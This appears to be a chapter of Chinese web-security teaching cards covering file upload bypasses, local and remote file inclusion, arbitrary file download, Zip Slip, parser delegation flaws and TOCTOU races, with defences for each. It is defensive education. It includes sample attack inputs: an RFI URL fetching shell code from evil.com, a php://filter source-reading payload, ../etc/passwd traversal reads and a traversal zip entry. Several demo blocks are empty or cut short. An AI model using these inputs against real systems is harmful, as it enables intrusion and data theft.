## 章导语

**共同本质**：**文件路径、文件内容、文件类型三者中至少有一个由用户控制，而服务端没有做严格约束。**上传、下载、包含、解压、解析——每个文件出入口都是这三要素的组合检查题，少查一样就漏。

**与前四个主题的衔接**：注入类把数据变成指令，攻击发生在**服务器解析环节**；客户端攻击借浏览器执行内容，攻击发生在**受害者的浏览器里**；认证与会话攻击的是**身份证明**；访问控制与授权攻击的是**权限边界**；本主题攻击的是**文件与资源的出入口**——路径、内容、类型三条线失守。防御重心：注入靠数据与指令分离、客户端攻击靠输出编码、认证靠凭证强度、授权靠逐次校验、**文件域靠「路径不拼用户输入 + 类型白名单与内容校验 + 处理过程沙箱化」**。

**本主题的三条底线**（6 条都可对号入座）：
1. **路径不来自用户**：文件路径由服务端映射表/随机名决定，用户只给 ID 或白名单内的名字。
2. **类型与内容双校验**：扩展名白名单 + 文件内容魔数（文件开头的格式指纹）校验，且上传目录不可执行。
3. **处理过程不信任文件**：解析、解压、转换都可能被构造触发执行——沙箱化、最小权限、逐条目校验。

**共同防护思路（三层）**：

1. **入口收敛（根治）**：路径用 ID 映射（复用访问控制与授权主题「ID 映射」思路）；类型白名单 + 内容魔数校验（复用 `file-magic`、`allowlist`）；解压逐条目规范化校验。
2. **执行隔离（加固）**：上传目录禁止脚本执行、文件存 Web 根外；解析/转换在沙箱（复用 `sandbox`）内跑（无网络、非 root、只读挂载）；临时文件用安全 API、原子移动。
3. **兜底**：大小/数量/频率限制；恶意内容扫描；处理超时与资源上限。

**本主题难度一览**（难度=学习复杂度，与危险度★无关；中/高=知识卡+案例演示+静态指导，交互闯关留待后续批次；**本主题无低档条目，故无 3 题自测**——6 条都涉及文件处理机制，无「单一输入点+生活例子+无前置」全满足者，这与本主题机制性本质一致）：

## 5.1 任意文件上传　`危险度 ★★★★★`　`本站难度：中`　【形态 B · 知识卡 + 案例演示 + 指导】

**元数据**｜`id: file-upload` ｜ `chapter: 5` ｜ `difficulty: intermediate` ｜ `format: interactive` ｜ `scene: Web, 系统` ｜ `hazard: 5` ｜ `aliases: 任意文件上传, 文件上传漏洞, Unrestricted File Upload, 上传绕过` ｜ `pinyin: {full: 'ren yi wen jian shang chuan', joined: 'renyiwenjianshangchuan', initial: 'rywjsc'}` ｜ `related: file-inclusion, path-traversal, webshell` ｜ `source: demo` ｜ `templateId: TPL-FILE`（认控制点=上传的类型/内容/文件名→试绕过=后缀变形/MIME 伪造/图片马→验证执行=上传目录可否当脚本跑→选根治=白名单+魔数+目录禁执行；文件类主场）｜ `stages: []`（第二期补，templateId 预留）

**难度判定**：三问法命中 2 项（问①前置>2：解析规则、内容魔数、目录执行权限是三个新概念；问③要构造多变体请求验证；问②不命中——解析规则是机制但非协议/状态机级，且路径规范化前序已讲，按二态判定不重叠计）——**有多个变体要分辨**（后缀/MIME/双后缀/图片马/解析漏洞），正中 06 §3.3 中档标准，与锚定示例「任意文件上传=中」维持一致。**边界说明**：若要求独立构造解析漏洞利用链（如配合解析器委托执行），难度升为高——但本卡目标是「认出绕过信号 + 布防」，不要求到那一层。

**oneLiner（一句话）**：上传功能对文件类型、内容、存储位置控制不严时，攻击者上传可执行脚本即可获得服务器权限。

**cause（成因与位置）**：上传链路上的校验面残缺——只看前端 `accept` 与 JS 校验（抓包即绕）；只做后缀黑名单（`php`、`jsp` 黑名单可被 `php5`、`phtml`、`Php` 等变体绕过）；只校验 `Content-Type`（请求头可伪造）；上传后文件落在 Web 可访问且可执行的目录。**「为什么后缀黑名单堵不住」**：文件「会不会被执行」不由后缀决定，而由**服务器的解析规则**决定；黑名单只能列举已知后缀，解析变体列举不完——正确做法是反过来用白名单（只许业务需要的类型）加内容魔数校验（文件开头的格式指纹，如 PNG 的固定字节，认「内容是什么」而非「名字叫什么」）。

**where（高发位置）**：头像/附件上传、模板/主题上传、报表导入、富文本图片上传、插件/扩展安装包、解压上传（联动 5.4）。

**kinds（分类）**：

| 类型 | 白话 | 信号 |
|---|---|---|
| 后缀变形绕过 | 换后缀写法过黑名单 | `a.php5`、`a.PhP`、`a.php.jpg`、`a.jpg.php` 生效 |
| MIME 伪造 | 改请求头的类型声明 | 只看 `Content-Type` 放行 |
| 图片马 | 图片头里藏代码 | 图片功能实际不校验内容 |
| 解析规则滥用 | 上传配置文件改解析 | `.htaccess`、`web.config` 上传成功 |
| 文件名可控 | 文件名参与路径构造 | `../../` 或绝对路径写入 |

**signals（典型特征）**：
- 改后缀、改 MIME、加双后缀（`a.php.jpg`、`a.jpg.php`）、加空字节 `%00` 截断（仅老版本 PHP 等受影响）后上传成功。
- 上传 `.htaccess` / `web.config` 改变解析规则。
- 图片头 + 代码的「图片」通过校验（配合文件包含或解析漏洞执行，见 5.2/5.5）。
- 上传目录可列目录、可直接访问、可执行脚本。

**impact（危害）**：可执行脚本落地 → 服务器完全沦陷（复用 `webshell`、`rce`）；上传 HTML/SVG → 存储型 XSS（复用 `xss`）；钓鱼页面托管在可信域名下；磁盘占满。

**verify（挖掘与验证思路）**：
1. 先确认服务端到底校验了什么：只改后缀 / 只改 MIME / 只改文件头 / 三者都改，逐项对照。
2. 逐个绕过：后缀变形（大小写、多点、分号、空格、`::$DATA` 这类 Windows 流写法）、MIME 伪造、文件头伪造（如 GIF89a 文件头）、内容检测绕过（图片马）。
3. 确认上传后的**路径是否可知、是否可直接访问、目录是否可执行**（演示样例，无害文件验证）。
4. 确认文件名/路径是否可控（`../../`、绝对路径）。
5. 检查是否有图片处理环节（可联动 5.5 解析器缺陷）与解压功能（可联动 5.4）。

**protect（防护）**：
- **root（根治）**：扩展名**白名单**（只允许业务需要的类型）+ **文件内容魔数**校验；文件名由服务端**随机生成**（如 UUID），原始文件名只入库展示、不参与路径构造。
- **harden（加固）**：上传目录**禁止脚本执行**（如 Nginx 对脚本后缀 `deny all`）；文件存 Web 根目录之外；上传后二次处理（图片重编码可消除图片马）；对象存储 + 独立域名 + `Content-Disposition: attachment` 避免同源执行。
- **fallback（兜底）**：限制大小、数量、频率；恶意内容扫描。

**mistakes（易错点）**：
- 只做后缀黑名单（变体列举不完）。
- 只在前端校验（抓包即绕）。
- 上传目录与站点同源且可执行（文件落地即中招）。
- 忽略「文件名可控」（联动路径问题）。
- 以为 `Content-Type` 校验有意义（请求头是客户端声明）。

**▶ 案例演示（caseDemo，第一期交付）**

**演示样例材料**（language: plaintext）：


**▶ 指导模式（guide，静态文字，默认展开可折叠）**

## 5.2 文件包含（LFI / RFI）　`危险度 ★★★★★`　`本站难度：高`　【形态 B · 知识卡 + 案例演示 + 指导】

**元数据**｜`id: file-inclusion` ｜ `chapter: 5` ｜ `difficulty: advanced` ｜ `format: interactive` ｜ `scene: Web, 系统` ｜ `hazard: 5` ｜ `aliases: 文件包含, LFI, RFI, 本地文件包含, 远程文件包含, Local File Inclusion` ｜ `pinyin: {full: 'wen jian bao han', joined: 'wenjianbaohan', initial: 'wjbh'}` ｜ `related: file-upload, path-traversal, deserialization` ｜ `source: demo` ｜ `templateId: TPL-FILE`（认控制点=包含路径参数→试绕过=相对路径/伪协议变体→验证执行=文件内容被装载执行→选根治=映射表+白名单+禁危险协议；文件类适用清单内含「包含」）｜ `stages: []`（第二期补，templateId 预留）

**难度判定**：三问法命中 3 项——问①前置>2（包含机制、伪协议、日志包含三个新概念）；问②要理解「文件内容被当作程序装载」这一机制本质；问③要构造多类变体验证（相对路径/伪协议/远程 URL）→ **高**。链式利用明显：单条包含读到配置不算完，包含+日志投毒、包含+图片马才到代码执行——组合多概念+链式，正中高档标准。

**oneLiner（一句话）**：程序把用户输入当作「要包含的文件路径」时，攻击者借此读取本地任意文件（LFI）或加载远程恶意代码执行（RFI）——包含是「把文件内容装进程序」，比读取更危险。

**cause（成因与位置）**：页面/模块/语言/模板参数（`?page=home`、`?lang=zh`、`?tpl=header`）被直接拼进文件路径。**「为什么包含比读取更危险」**：读取只是把文件内容**显示给你**（看到即止）；包含是把文件内容**当作程序的一部分装载执行**——同样是拿到 `passwd`，包含能让「日志里的一行 payload」变成「被执行的代码」。LFI（本地包含）读本地文件、RFI（远程包含，需服务器允许远程加载）直接拉攻击者服务器上的代码。

**where（高发位置）**：多语言/多模板站点的 `page`/`lang`/`tpl`/`mod` 参数、插件加载器、配置驱动的模块路由。

**kinds（分类）**：

| 类型 | 白话 | 信号 |
|---|---|---|
| LFI 相对路径 | `../../` 走到任意文件 | `?page=../../../../etc/passwd` 返回系统文件 |
| LFI 伪协议 | 用协议包装读/执行 | `php://filter` 读源码、`data://` 执行、`phar://` 触发反序列化（复用 `deserialization`） |
| RFI 远程包含 | 直接拉远程代码 | `?page=http://evil.com/shell.txt` 被装载 |
| 日志/会话包含 | 把 payload 写进日志再包含 | 包含 access.log 后代码被执行 |

**signals（典型特征）**：
- `?page=home` 这类「像文件名」的参数改成 `../../../../etc/passwd` 返回系统文件内容。
- PHP 伪协议生效（`php://filter/convert.base64-encode/resource=index.php` 读到源码）。
- RFI：`?page=http://evil.com/shell.txt` 被加载（需服务器允许远程包含）。
- 上传的图片被「当作脚本包含」执行（图片马联动 5.1）。

**impact（危害）**：源码与配置泄露（数据库口令、密钥）→ 进一步远程代码执行（复用 `rce`）；日志包含（把 payload 写进访问日志再包含）直接命令执行；配合上传的图片马执行——**单条 LFI 是信息泄露，链式才到沦陷**。

**verify（挖掘与验证思路）**：
1. 找所有「页面/模块/语言/模板」参数，观察值是否像文件名。
2. 用相对路径探测深度（`../../`、`..\..\`、绝对路径）。
3. 尝试伪协议读源码（演示样例，目标文件为虚构）：`?page=php://filter/convert.base64-encode/resource=index.php`——注意参数直通 include 时包装器必须在参数开头，找数据库凭据。
4. 尝试包含日志文件 / 会话文件 / 进程环境文件。
5. 确认服务器是否限制可访问目录、是否禁用远程包含与危险伪协议。

**protect（防护）**：
- **root（根治）**：**不用用户输入拼文件路径**——映射表（`page=home` → `pages/home.php`，复用访问控制与授权主题「ID 映射」思路）；白名单枚举；包含文件用绝对路径常量。
- **harden（加固）**：限制脚本可访问目录（如 PHP 的 `open_basedir`）；禁用危险伪协议与远程包含（`allow_url_include=Off`）。
- **fallback（兜底）**：错误信息不回显文件内容；异常包含尝试告警。

**mistakes（易错点）**：
- 只过滤 `../`（编码、`....//`、`..%2f` 变体绕过——同 4.3 教训）。
- 以为「没有回显」就没漏洞（伪协议/base64 外带照样能带出内容）。
- 只防 LFI 不防 RFI（远程加载开关没关）。
- 以为「只读不执行」就安全——LFI 泄露的密钥/源码是下一环的钥匙。

**▶ 案例演示（caseDemo，第一期交付）**

**演示样例材料**（language: plaintext）：

```

服务端逻辑（演示样例）：
```

## 5.3 任意文件读取 / 下载　`危险度 ★★★★☆`　`本站难度：中`　【形态 B · 知识卡 + 案例演示 + 指导】

**元数据**｜`id: arbitrary-file-read` ｜ `chapter: 5` ｜ `difficulty: intermediate` ｜ `format: interactive` ｜ `scene: Web, 系统` ｜ `hazard: 4` ｜ `aliases: 任意文件读取, 任意文件下载, 目录下载, File Download` ｜ `pinyin: {full: 'ren yi wen jian xia zai', joined: 'renyiwenjianxiazai', initial: 'rywjxz'}` ｜ `related: path-traversal, idor, file-inclusion` ｜ `source: demo` ｜ `templateId: TPL-FILE`（认控制点=下载路径/文件标识→试绕过=../ 或换他人标识→验证执行=读到限定范围外文件→选根治=ID 映射+归属校验+目录白名单；「读取」在文件类适用清单内）｜ `stages: []`（第二期补，templateId 预留）

**难度判定**：三问法命中 2 项——问①：归属校验与路径规范化已由访问控制与授权主题（4.1/4.3）讲过，按前置计数规则**不计入**；新概念仅「下载业务面的两道校验并存」1 个；但**问③构造多变体请求**（路径变体+间接标识）与「多个变体要分辨」（编码变体、文件名/ID/业务编号）命中——按 06 §3.3 中档标准（多变体）判**中**。**与 4.3 路径穿越的边界**：路径穿越是「机制」（`../` 走出目录，归属在访问控制与授权主题）；本条是「下载业务面」——校验缺**两道**：归属（这文件是不是你的）+ 目录（这文件在不在允许范围），两者都要。

**oneLiner（一句话）**：下载接口未同时校验文件归属与目录范围时，攻击者可读取服务器任意文件或他人文件。

**cause（成因与位置）**：下载/导出接口按参数拼文件路径或按文件标识取文件，省了两道校验——① 归属：这文件归谁（同 4.1 的「ID 是门牌号不是钥匙」思路，此处门牌是文件标识）；② 目录：这文件在不在允许下载的目录白名单内。任一缺失即越界。**「为什么这不全是路径穿越」**：路径穿越只是越界的一种手法（改路径）；换他人文件 ID、猜他人文件名也能拿到文件——那是归属缺失。修「过滤 `../`」只堵了一半。

**where（高发位置）**：`/download?filename=report.pdf`、`/export?path=/data/xxx`、发票/合同/证件照下载、附件预览、备份文件下载。

**kinds（分类）**：

| 类型 | 白话 | 信号 |
|---|---|---|
| 路径越界 | 改路径走到系统文件 | `../../etc/passwd`、`WEB-INF/web.xml` 可读 |
| 归属越界 | 换标识读他人文件 | 改文件 ID/文件名拿到他人发票、合同 |
| 敏感文件直读 | 配置/密钥在可读范围 | `.env`、`application.yml`、私钥可下载 |

**signals（典型特征）**：
- `?filename=` / `?path=` 参数改成越界路径后返回系统文件（`/etc/passwd`、`WEB-INF/web.xml`、`application.yml`、`.env`、私钥）。
- 改文件 ID/业务编号后下载到他人文件（发票、合同、身份证照片）。
- 导出接口把整个目录打成包返回。

**impact（危害）**：凭据泄露、源码泄露、用户隐私数据泄露；泄露的凭据/源码是下一环的钥匙（联动认证与会话主题、访问控制与授权主题）。

**verify（挖掘与验证思路）**：
1. 收集全部下载/导出/预览参数（文件名、路径、文件 ID、业务编号）。
2. 路径面：`../` 变体、编码变体、绝对路径（同 4.3 手法，此处验证业务面）。
3. 归属面：双账号换文件标识重放（同 4.1 手法）。
4. 确认敏感目录是否在可读范围；用文件存在性/大小差异确认读取成功。

**protect（防护）**：
- **root（根治）**：文件用 **ID 映射**到真实路径（用户不传路径）；下载前**校验文件归属**（`resource.owner_id == current_user`，复用 `idor` 的归属校验思路）。
- **harden（加固）**：路径规范化 + 目录白名单（复用 `path-traversal` 防护）；敏感目录不可读；批量导出逐条校验归属。
- **fallback（兜底）**：下载行为审计留痕。

**mistakes（易错点）**：
- 只堵 `../` 不校验归属（换 ID 照样读他人文件）。
- 只校验归属不设目录白名单（路径越界仍在）。
- 以为「文件名是 UUID 就安全」——难猜≠授权（4.1 教训在文件域重演）。
- 导出接口整包打包不逐条校验。

**▶ 案例演示（caseDemo，第一期交付）**

**演示样例材料**（language: plaintext）：

```
场景（演示样例，站点 example.com 的发票下载）：
本条涉及两个端点（演示样例，参数名不同、各有侧重）：
  端点甲（归属面）：GET /invoices/download?fileId=1002  —— 按文件 ID 取文件
  端点乙（路径面）：GET /export/download?file=report.pdf —— 按文件名/路径取文件

攻击步骤：
1. 账号 A 经端点甲正常下载自己的发票 fileId=1001（正常）
2. 把 fileId 换成 1002（账号 B 的发票），会话不变，重放端点甲
   → 服务端只按 ID 取文件，不查「这发票是谁的」
   → 返回 B 的发票（归属校验缺失）
3. 路径面变体（演示样例）：端点乙 GET /export/download?file=../../etc/passwd
   → 拼接越界、无目录白名单 → 返回系统文件（目录校验缺失）

逻辑链自查：
输入（换他人文件标识 / 路径带 ../）
→ 机制（归属校验与目录白名单两道都缺）
→ 结果（读到他人文件 / 限定范围外系统文件）✔ 每步成立
```

note：材料为演示样例，站点与文件为虚构，非现场运行、非真实系统。修法对照：归属校验（第 2 步被拒）+ ID 映射+目录白名单（第 3 步被拒）——两道都要修，修一道漏一道。

**▶ 指导模式（guide，静态文字，默认展开可折叠）**

- **why（为什么盯这里）**：下载是「文件出站」的口子，两道锁都要在：**这文件是不是你的**（归属）、**这文件该不该被下载**（目录）。少一道就漏——换 ID 漏归属、改路径漏目录。与 4.3 的分工：4.3 讲穿越机制，本条讲下载业务面「两道校验并存」。
- **how（下一步看什么、怎么判断）**：① 盘点下载/导出/预览参数；② 路径面与归属面分开测（../ 变体 / 换标识）；③ 查敏感目录是否在可读范围；④ 修复按「ID 映射 + 归属校验 + 目录白名单」三件套，缺一不可。

## 5.4 ZIP Slip / 解压路径穿越　`危险度 ★★★★☆`　`本站难度：中`　【形态 B · 知识卡 + 案例演示 + 指导】

**元数据**｜`id: zip-slip` ｜ `chapter: 5` ｜ `difficulty: intermediate` ｜ `format: interactive` ｜ `scene: Web, 系统` ｜ `hazard: 4` ｜ `aliases: ZIP Slip, 解压路径穿越, 压缩包穿越, 解压漏洞` ｜ `pinyin: {full: 'jie ya lu jing chuan yue', joined: 'jieyalujingchuanyue', initial: 'jyljcy'}` ｜ `related: path-traversal, file-upload, temp-file` ｜ `source: demo` ｜ `templateId: TPL-FILE`（认控制点=压缩包内条目名→试绕过=条目名带 ../→验证执行=文件写出目标目录→选根治=逐条目规范化+目录校验；「路径穿越」在文件类适用清单内，本条是其解压场景）｜ `stages: []`（第二期补，templateId 预留）

**难度判定**：三问法命中 2 项——问①新概念 1~2 个（解压条目名也是路径、解压炸弹限幅），路径规范化机制 4.3 已讲（不计入）；问③构造压缩包验证（要造带 `../` 条目名的包，构造细节具体）→ 按「有多个变体要分辨 + 要构造」判**中**。**与 4.3 的边界**：4.3 的 `../` 在**请求参数**里（服务器拼路径），本条的 `../` 在**压缩包条目名**里（解压器拼路径）——攻击面不同、修复面不同（前者改参数处理，后者改解压器逐条目校验）。

**oneLiner（一句话）**：解压时不校验压缩包内条目名，含 `../` 的条目会被写到目标目录之外，覆盖配置或写入可执行文件。

**cause（成因与位置）**：解压器把条目名直接拼到目标目录后写盘。压缩包内的文件名是**用户数据**——攻击者可以把 `../../../../var/www/shell.jsp` 这样的名字放进包里，解压时文件被写到目标目录之外。**「为什么解压要逐条目校验」**：压缩包的「文件名」和上传的「文件名」一样都是用户控制的输入；解压器只是「照单落盘」，不问这个名字要去哪——每解出一个文件前，都要先规范化这个条目路径、确认它在目标目录内。

**where（高发位置）**：主题/模板包导入、插件安装包、备份恢复、批量文件上传的解压环节、日志包/数据包导入。

**kinds（分类）**：

| 类型 | 白话 | 信号 |
|---|---|---|
| 穿越写入 | 条目名带 `../` 写出目录 | 解压后目标目录外出现文件 |
| 覆盖攻击 | 写到关键位置覆盖配置 | 配置/脚本被包内同名条目覆盖 |
| 解压炸弹 | 超大解压占满磁盘 | 小包解出巨量文件（限幅联动） |

**signals（典型特征）**：
- 上传 zip 后解压；压缩包内文件名形如 `../../../../var/www/shell.jsp`。
- 解压后在目标目录之外出现文件；关键配置被覆盖。

**impact（危害）**：覆盖配置（改解析规则、改权限）；写入可执行文件（联动 5.1 成 WebShell）；解压炸弹占满磁盘拒绝服务。

**verify（挖掘与验证思路）**：
1. 构造带 `../` 条目名的测试压缩包（演示样例，写入无害标记文件）。
2. 上传并解压，检查目标目录外是否出现文件、是否覆盖同名文件。
3. 测试绝对路径条目名（`/etc/cron.d/x` 类写入位置，授权环境）。
4. 测试解压总大小与文件数限制（防解压炸弹）。

**protect（防护）**：
- **root（根治）**：解压前**逐条目规范化**路径并校验是否在目标目录内（复用 `path-traversal` 的规范化+白名单思路）；拒绝绝对路径与 `..`。
- **harden（加固）**：限制解压总大小与文件数（防解压炸弹）；解压后不保留可执行权限；解压到隔离临时区再校验（联动 5.6）。
- **fallback（兜底）**：解压审计留痕。

**mistakes（易错点）**：
- 只校验压缩包本身「是不是 zip」，不看**条目名**。
- 校验了首条条目、其余条目放行（同 4.1「批量逐条校验」教训）。
- 忽略解压炸弹（大小/数量没限）。
- 以为「解压到临时目录就安全」——临时目录可写可执行照样中招（联动 5.6）。

## 5.5 文件解析与预览类漏洞　`危险度 ★★★★☆`　`本站难度：中`　【形态 B · 知识卡 + 案例演示 + 指导】

**元数据**｜`id: file-parsing` ｜ `chapter: 5` ｜ `difficulty: intermediate` ｜ `format: interactive` ｜ `scene: Web, 系统` ｜ `hazard: 4` ｜ `aliases: 文件解析漏洞, 解析器漏洞, 预览转换漏洞, ImageMagick, 文档转换` ｜ `pinyin: {full: 'wen jian jie xi lou dong', joined: 'wenjianjiexiloudong', initial: 'wj jxld'}` ｜ `related: file-upload, file-inclusion, sandbox` ｜ `source: demo` ｜ `templateId: TPL-FILE`（认控制点=交给解析器的文件内容→试绕过=构造触发危险委托的文件→验证执行=解析器行为变化/命令执行→选根治=沙箱化+禁危险委托+升级；文件处理流水线四关贴合）｜ `stages: []`（第二期补，templateId 预留）

**难度判定**：三问法命中 2 项——问①新概念 2 个（解析器委托机制、沙箱隔离）；问③要构造恶意文件验证；问②不命中——委托机制是机制但非协议/状态机级，按二态判定不与 5.1 重叠计 → 按「要理解一个机制 + 多变体」判**中**。**边界说明**：若要求独立构造解析器委托利用链（如 ImageMagick 委托执行的完整构造），难度升为高——本卡目标是「认出风险信号 + 布防沙箱」，不要求到那一层。

**oneLiner（一句话）**：文档/图片/媒体的解析器处理攻击者构造的文件时触发缺陷或危险委托，即可执行命令。

**cause（成因与位置）**：上传后自动生成缩略图/预览/转换 PDF 的环节，调用解析器（ImageMagick、LibreOffice、PDF 渲染、Office 转换服务）处理用户文件。解析器为支持多格式会「委托」外部处理——**「为什么解析图片也能执行命令」**：解析器不是只「看」图片，它为了支持各种格式（矢量图、外链、宏）会**调用外部程序处理**；文件里可以写着「去执行某某命令」的指令，解析器照做——**解析 = 信任文件内容里的指令**，和注入「信任用户输入」是同一类错误，只是信的是文件。历史上如 ImageMagick 的委托缺陷（ImageTragick 类）就是「图片里写指令、解析器执行」。

**where（高发位置）**：头像缩略图生成、文档预览/转 PDF、Office 转换服务、媒体转码（`convert`、`ffmpeg`、`soffice` 等外部命令调用处）。

**kinds（分类）**：

| 类型 | 白话 | 信号 |
|---|---|---|
| 委托执行 | 文件里写指令、解析器照做 | 矢量图/外链处理触发外部程序 |
| 解析器缺陷 | 特定格式触发解析器漏洞 | 恶意文件致解析器崩溃/执行 |
| 命令拼接 | 文件名/参数拼进外部命令 | 转换命令里出现用户数据 |

**signals（典型特征）**：
- 上传后自动生成缩略图/预览/转换 PDF。
- 处理链路使用 `convert`、`ffmpeg`、`soffice` 等外部命令。
- 解析器版本老旧、危险格式/委托未禁用（如 ImageMagick 的 MSL/SVG/MVG 委托未关）。

**impact（危害）**：处理恶意文件即远程代码执行（复用 `rce`）；服务横向（转换服务常有内网访问权）；拒绝服务（畸形文件拖垮解析器）。

**verify（挖掘与验证思路）**：
1. 盘点所有「上传后自动处理」的环节（缩略图、预览、转换、转码）。
2. 确认处理链路调用的解析器与版本、是否走外部命令、命令行是否含用户数据。
3. 在授权环境用公开的畸形测试样本验证解析器行为（演示样例，无害样本）。
4. 检查处理是否沙箱化（网络、权限、文件系统边界）。

**protect（防护）**：
- **root（根治）**：处理在**沙箱/容器**内进行（无网络、非 root、只读挂载，复用 `sandbox`）；禁用危险委托（如 ImageMagick 配置里关闭 URL/MSL 类委托）。
- **harden（加固）**：及时升级解析器；限制处理时间与内存；避免 shell 调用外部命令（参数数组传参，同命令注入主题的根治思路）。
- **fallback（兜底）**：处理失败快速失败并告警；文件内容扫描。

**mistakes（易错点）**：
- 以为「只是生成缩略图」无风险——处理即信任文件内容。
- 只升级解析器不关危险委托（配置面没收紧）。
- 处理服务权限过大（可访问内网/密钥）。
- 命令行拼接文件名（联动注入类主题的命令注入）。

**▶ 案例演示（caseDemo，第一期交付）**

**演示样例材料**（language: plaintext）：

```

  上传图片 → 调用外部命令生成缩略图：
  convert <用户文件> /thumbs/<随机名>.png
```

## 5.6 临时文件与竞争条件　`危险度 ★★★☆☆`　`本站难度：高`　【形态 B · 知识卡 + 案例演示 + 指导】

**元数据**｜`id: toctou-race` ｜ `chapter: 5` ｜ `difficulty: advanced` ｜ `format: interactive` ｜ `scene: Web, 系统` ｜ `hazard: 3` ｜ `aliases: 竞争条件, TOCTOU, 临时文件漏洞, Time-of-check to Time-of-use, 竞态` ｜ `pinyin: {full: 'lin shi wen jian jing zheng tiao jian', joined: 'linshiwenjianjingzhengtiaojian', initial: 'lswjjztj'}` ｜ `related: zip-slip, file-upload, temp-file` ｜ `source: demo` ｜ `templateId: TPL-CHAIN`（认边界=检查与使用之间的时间窗→试可达=窗口内替换文件→判影响=绕过检查/读到敏感内容→选根治=原子操作+安全临时文件 API；时序链非单一文件控制点，挂 CHAIN 并注明理由）｜ `stages: []`（第二期补，templateId 预留）

**难度判定**：三问法命中 3 项——问①前置>2（TOCTOU 时序窗口、原子操作、临时文件权限三个新概念）；问②要理解「检查-使用两步间的时间差」这一时序机制（协议/状态机级）；问③要构造并发验证（多线程/多请求制造窗口）→ **高**。本条是本主题最抽象的一条：现象不直观（竞态窗口肉眼看不见），要靠推理理解「检查过 ≠ 用的还是检查过的那个」。

**oneLiner（一句话）**：临时文件命名可预测、权限过宽，或「检查」与「使用」之间存在时间窗（TOCTOU）时，文件可被替换或读取。

**cause（成因与位置）**：处理文件分两步——先「检查」（扫毒/校验内容）后「使用」（移动到正式目录/执行）。两步不是原子的，中间有时间窗；窗口内文件可被替换（同进程的另一线程、同主机的另一请求、共享临时目录的他人）。**「为什么『检查过』不等于『用的还是检查过的那个』」**：检查的和使用的若不是同一次读取，中间隔的时间够换人——像安检后到登机口之间，行李被调包。TOCTOU（检查与使用之间的时序差）就是这个窗口的名字；临时文件命名可预测、权限过宽则让「换人」更容易。**攻击前提**：攻击者需具备「同路径写文件」的能力——同应用的另一个可写接口、或共享主机上的本地用户；若临时目录带粘滞位且文件名不可预测，此链即被阻断（正是修法所在）。

**where（高发位置）**：上传「先扫毒再落正式目录」流程、临时目录共享的处理链路、可预测临时文件名的生成处、解压到临时区再移动的流程（联动 5.4）。

**kinds（分类）**：

| 类型 | 白话 | 信号 |
|---|---|---|
| 检查-使用竞态 | 扫毒与落盘之间被替换 | 恶意内容绕过扫描生效 |
| 临时文件可预测 | 名字能猜到 | 顺序/时间戳命名的临时文件 |
| 临时文件权限宽 | 他人可读可写 | 临时目录权限过宽、未设创建时权限 |

**signals（典型特征）**：
- 「先检查再移动/使用」两步分离、无原子操作。
- 临时文件命名可预测（顺序号、时间戳）；权限在创建后才设置。
- 多请求并发下结果不一致（竞态可观测面）。

**impact（危害）**：恶意文件绕过检查落地（等同 5.1 后果）；临时文件被替换/窃取；敏感中间文件泄露（复用 `info-leak`）。

**verify（挖掘与验证思路）**：
1. 盘点「检查→使用」两步的处理流程（扫毒后移动、校验后执行、解压后处理）。
2. 构造并发请求（演示样例，多线程同时触发），尝试在窗口内替换临时文件。
3. 检查临时文件命名规律、创建时权限、临时目录共享范围。
4. 确认「检查」与「使用」是否同一读取（哈希比对、原子移动）。

**protect（防护）**：
- **root（根治）**：先写入只有服务端可访问的私有目录、使用不可预测的文件名（安全临时文件 API 如 `mkstemp`、`Files.createTempFile`，创建时即设权限），再以**原子 rename** 移入正式目录；检查基于同一文件句柄——避免「先检查再使用」的分离。
- **harden（加固）**：上传先落隔离临时区、校验后以原子 rename 移入正式目录；临时目录私有、最小权限、粘滞位。
- **fallback（兜底）**：并发异常告警；临时文件超时清理。

**mistakes（易错点）**：
- 以为「扫过毒就安全」——扫毒与落盘之间有窗口。
- 临时文件名可预测（顺序/时间戳）。
- 权限后设（创建时默认宽权限）。
- 用「再检查一遍」缓解竞态——不原子，只是把窗口变短。

**▶ 案例演示（caseDemo，第一期交付）**

**演示样例材料**（language: plaintext）：

```
场景（演示样例，站点 example.com 的头像上传）：
服务端流程（演示样例，两步不原子）：
  步骤 A：保存到 /tmp/avatar_123 → 扫毒检查内容
  步骤 B：检查通过后，把 /tmp/avatar_123 移动到 /var/www/avatars/123.png

攻击步骤（演示样例，两请求并发）：
1. 请求 1：上传正常图片 → 服务端进入步骤 A（扫毒中）
2. 请求 2：在「扫毒完成、尚未移动」的窗口内

3. 步骤 B 执行：移动的是**替换后**的文件

逻辑链自查：
输入（窗口内替换临时文件）
→ 机制（检查与使用分离、临时文件可预测可写，TOCTOU 时间窗）

```

note：材料为演示样例，站点与流程为虚构、替换内容为无害标记，非现场运行、非真实系统。修法对照：私有目录 + 不可预测文件名（替换不到）+ 原子 rename 移入（检查基于同一文件句柄、检查后即定稿，窗口不存在）。

**▶ 指导模式（guide，静态文字，默认展开可折叠）**

- **why（为什么盯这里）**：盯「检查和使用之间隔了多久、隔的是不是同一个文件」。两步分离就有窗口，窗口内文件可被调包——**检查的和用的，必须是同一次读取**。临时文件的命名与权限决定「调包」难度。
- **how（下一步看什么、怎么判断）**：① 找「检查→使用」两步流程；② 看临时文件命名与权限；③ 并发构造窗口验证（授权环境）；④ 修复按「私有目录 + 不可预测文件名 + 原子 rename」三件套。

〔本条术语锚点〕`toctou-race`、`toctou`、`temp-file`（均为本条新增）｜ `file-upload`（本章前条）｜ `sandbox`（复用，更早章节）

**相关术语网**：`toctou-race` → 机制：`toctou`（检查-使用时序差，06 附录 F 指定落地词）｜ 载体：`temp-file` ｜ 触发场景：`file-upload`（扫毒后落盘）、`zip-slip`（解压到临时区）｜ 同类错误：访问控制与授权主题的「查过一次就信」（时序版）｜ 隔离思路：`sandbox`（复用）
